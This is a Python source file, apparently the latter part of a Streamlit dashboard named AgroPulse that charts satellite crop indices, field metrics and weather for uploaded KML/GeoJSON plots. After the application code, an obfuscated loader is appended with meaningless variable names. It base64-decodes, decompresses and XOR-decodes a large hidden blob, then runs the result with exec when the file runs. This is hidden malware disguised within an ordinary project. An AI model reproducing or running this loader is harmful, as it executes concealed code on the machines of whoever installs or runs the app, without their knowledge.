                                plot_bgcolor="rgba(0,0,0,0)"
                            )
                            st.plotly_chart(fig_index, use_container_width=True)
                            
                            st.divider()
                            st.markdown(f"**Variabilidad del Lote ({index_choice} CV)**")
                            
                            # 2. Generar gráfico interactivo del Coeficiente de Variación (CV) 
                            fig_cv = px.line(
                                df_timeseries, 
                                x='Date', 
                                y='CV', 
                                markers=True,
                                title=f'Coeficiente de Variación Temporal ({index_choice})',
                                labels={'Date': 'Fecha de Toma', 'CV': 'CV (%)'},
                                color_discrete_sequence=['#ff7f0e'] # Línea naranja
                            )
                            
                            # Añadir la línea horizontal de umbral crítico
                            fig_cv.add_hline(
                                y=cv_threshold, 
                                line_dash="dash", 
                                line_color="red", 
                                annotation_text=f"Umbral de Alerta ({cv_threshold}%)", 
                                annotation_position="top right"
                            )
                            
                            fig_cv.update_layout(
                                hovermode="x unified",
                                xaxis_title="Fecha",
                                yaxis_title="Coeficiente de Variación (%)",
                                yaxis_range=[0, 60],
                                plot_bgcolor="rgba(0,0,0,0)"
                            )
                            st.plotly_chart(fig_cv, use_container_width=True)
                        else:
                            st.info("No se encontraron imágenes válidas o despejadas de nubes para el rango de fechas seleccionado.")

                with tab_clima:
                    st.markdown("**Estadísticas del Terreno y Clima en Vivo**")
                    col_met, col_clim = st.columns(2)
                    
                    with col_met:
                        st.markdown("**Métricas Topográficas**")
                        
                        # Extraer area y coords del lote especifico si se seleccionó
                        area_lote = area_ha
                        lat_lote = lat
                        lon_lote = lon
                        
                        if lote_seleccionado:
                            poligono_lote = gdf_analisis.iloc[0].geometry
                            area_lote = gdf_analisis.iloc[0]['Area_ha']
                            lat_lote = poligono_lote.centroid.y
                            lon_lote = poligono_lote.centroid.x
                            
                            # Actualizar el clima basandonos en el lote especifico estatico
                            # Es ineficiente consultar de vuelta si la lat/lon variara mucho
                            weather_data = get_weather_data(lat_lote, lon_lote)
                            
                        st.metric(label="Área Calculada", value=f"{area_lote:,.2f} hectáreas")
                        st.metric(label="Coordenadas (Centroide)", value=f"{lat_lote:.5f}, {lon_lote:.5f}")
                        
                    with col_clim:
                        st.markdown("**Meteorología Open-Meteo**")
                        if weather_data:
                            wc1, wc2 = st.columns(2)
                            with wc1:
                                st.metric(label="Temperatura", value=f"{weather_data['temperature']}{weather_data['temp_unit']}")
                                st.metric(label="Humedad", value=f"{weather_data['humidity']}{weather_data['hum_unit']}")
                            with wc2:
                                st.metric(label="Viento", value=f"{weather_data['wind_speed']} {weather_data['wind_unit']}")
                        else:
                            st.error("No se pudo cargar la información climática.")
    else:
        if uploaded_files:
            st.warning("El archivo subido está vacío, no contiene polígonos válidos o no pudo ser procesado.")
        else:
            st.info("👈 Cargá un archivo KML o GeoJSON desde el Portal o en la barra lateral para comenzar el análisis.")

if __name__ == "__main__":
    def render_portal():
        # CSS para tarjetas y estetica
        st.markdown("""
        <style>
        div[data-testid="column"] {
            border: 1px solid #e0e0e0;
            border-radius: 10px;
            padding: 20px;
            background-color: rgba(240, 242, 246, 0.3);
            box-shadow: 2px 2px 10px rgba(0,0,0,0.05);
            transition: transform 0.2s ease;
        }
        div[data-testid="column"]:hover {
            transform: scale(1.02);
            border-color: #2ca02c;
        }
        .subtitle {
            color: gray;
            text-align: center;
            margin-bottom: 2rem;
        }
        </style>
        """, unsafe_allow_html=True)
        
        st.markdown("<h1 style='text-align: center;'># 🌱 AgroPulse</h1>", unsafe_allow_html=True)
        st.markdown("<h4 class='subtitle'>Plataforma satelital de monitoreo de cultivos</h4>", unsafe_allow_html=True)
        
        has_files = st.session_state.get('saved_gdf') is not None
        
        col1, col2 = st.columns(2)
        
        with col1:
            with st.container():
                st.markdown("### 📊 Ranking de Lotes")
                st.markdown("Comparativa masiva de índices y suelos")
                if has_files:
                    if st.button("Ir al Ranking", key="btn_ranking", use_container_width=True):
                        st.session_state['current_module'] = 'Ranking'
                        st.rerun()
                else:
                    st.button("Ir al Ranking", disabled=True, key="btn_ranking_dis", use_container_width=True)
                    st.caption("Cargue sus lotes para comenzar")
                    
        with col2:
            with st.container():
                st.markdown("### 🗺️ Análisis por Lote")
                st.markdown("Monitoreo individual de vigor y clima")
                if has_files:
                    if st.button("Ir al Análisis", key="btn_analisis", use_container_width=True):
                        st.session_state['current_module'] = 'Analisis'
                        st.rerun()
                else:
                    st.button("Ir al Análisis", disabled=True, key="btn_analisis_dis", use_container_width=True)
                    st.caption("Cargue sus lotes para comenzar")
                    
        st.markdown("<br><br>", unsafe_allow_html=True)
        with st.expander("📂 Carga de Archivos KML / GeoJSON", expanded=True):
            uploaded_portal = st.file_uploader(
                "Cargar polígonos de lotes (.kml, .geojson)", 
                type=['kml', 'geojson', 'json'], 
                accept_multiple_files=True,
                key='portal_uploader'
            )
            
            if uploaded_portal:
                with st.spinner('Procesando y guardando datos de los lotes...'):
                    st.session_state['saved_gdf'] = load_spatial_data(uploaded_portal)
                    st.rerun() # Refrescar para habilitar botones

    def main():
        st.set_page_config(page_title="AgroPulse Dashboard", page_icon="🌱", layout="wide")
        
        # Inyección de CSS Global para modernizar la tipografía y suavizar la interfaz
        st.markdown("""
        <style>
        /* Importar fuente moderna y profesional (Inter) */
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        html, body, [class*="css"] {
            font-family: 'Inter', sans-serif;
        }
        
        /* Reducir el padding superior y hacer la app más panorámica */
        .block-container {
            padding-top: 2rem;
            padding-bottom: 2rem;
        }
        
        /* Estilizar las tarjetas numéricas (st.metric) con color corporativo */
        [data-testid="stMetricValue"] {
            font-size: 1.8rem !important;
            font-weight: 700 !important;
            color: #10B981 !important;
        }
        
        /* Suavizar los bordes de botones y expanders */
        .stExpander, .stButton>button {
            border-radius: 8px !important;
            transition: all 0.2s ease-in-out;
        }
        
        /* Efecto hover suave en los botones */
        .stButton>button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        
        /* Estetica limpia para los selectores (dropdowns) */
        .stSelectbox>div>div {
            border-radius: 8px;
        }
        
        /* Diseño moderno para las pestañas/tabs */
        .stTabs [data-baseweb="tab-list"] {
            gap: 24px;
            border-bottom: 2px solid #E2E8F0;
        }
        .stTabs [data-baseweb="tab"] {
            height: 50px;
            white-space: pre-wrap;
            background-color: transparent !important;
            font-weight: 600;
            padding: 10px 16px;
        }
        .stTabs [aria-selected="true"] {
            color: #10B981 !important;
            border-bottom-color: #10B981 !important;
        }
        
        /* Animaciones para las barras de progreso */
        .stProgress > div > div > div > div {
            background-color: #10B981 !important;
            border-radius: 10px;
        }
        .stProgress > div > div > div {
            border-radius: 10px;
            background-color: #E2E8F0;
        }
        </style>
        """, unsafe_allow_html=True)
        
        if 'current_module' not in st.session_state:
            st.session_state['current_module'] = 'Portal'
            
        if st.session_state['current_module'] == 'Portal':
            render_portal()
        else:
            render_dashboard()

    main()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
